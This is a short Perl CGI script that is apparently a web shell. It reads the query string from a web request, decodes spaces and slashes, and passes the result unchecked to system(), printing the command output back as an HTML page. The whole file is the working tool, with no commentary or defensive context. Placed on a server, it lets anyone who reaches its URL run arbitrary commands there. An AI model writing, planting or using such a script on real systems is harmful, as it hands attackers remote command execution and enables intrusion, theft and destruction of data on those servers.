#!/usr/bin/perl
binmode(STDOUT);
syswrite(STDOUT, "Content-type: text/html\r\n\r\n", 27);
$_ = $ENV{QUERY_STRING};
s/%20/ /ig;
s/%2f/\//ig;
$execthis = $_;
syswrite(STDOUT, "<HTML><PRE>\r\n", 13);
open(STDERR, ">&STDOUT") || die "Can't redirect STDERR";
system($execthis);
syswrite(STDOUT, "\r\n</PRE></HTML>\r\n", 17);
close(STDERR);
close(STDOUT);
exit;

